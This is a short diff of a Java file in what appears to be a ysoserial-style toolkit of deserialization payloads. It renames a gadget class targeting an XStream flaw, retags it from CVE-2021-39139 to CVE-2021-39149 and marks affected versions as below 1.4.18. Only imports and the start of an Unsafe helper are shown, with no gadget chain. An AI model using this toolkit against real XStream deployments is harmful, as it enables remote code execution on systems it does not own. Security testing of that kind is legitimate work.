@@ -1,12 +1,8 @@
 package com.h2tg.ysogate.payloads.gadgets;
 
-import javassist.CtClass;
-import org.apache.commons.beanutils.BeanComparator;
 import com.h2tg.ysogate.payloads.ObjectPayload;
-import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
-import com.h2tg.ysogate.utils.PayloadRunner;
 import com.h2tg.ysogate.utils.Reflections;
 import sun.misc.Unsafe;
 
@@ -21,10 +17,10 @@ import java.util.HashMap;
 import java.util.LinkedHashMap;
 import java.util.LinkedHashSet;
 
-// Xstream CVE-2021-39139
+// Xstream CVE-2021-39149
 
-@Dependencies({"Xstream:1.4.11"})
-public class XStream1 implements ObjectPayload<Object> {
+@Dependencies({"Xstream < 1.4.18"})
+public class XStream39149 implements ObjectPayload<Object> {
 
     private static Unsafe instaniateUnsafe() throws Exception {
         Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
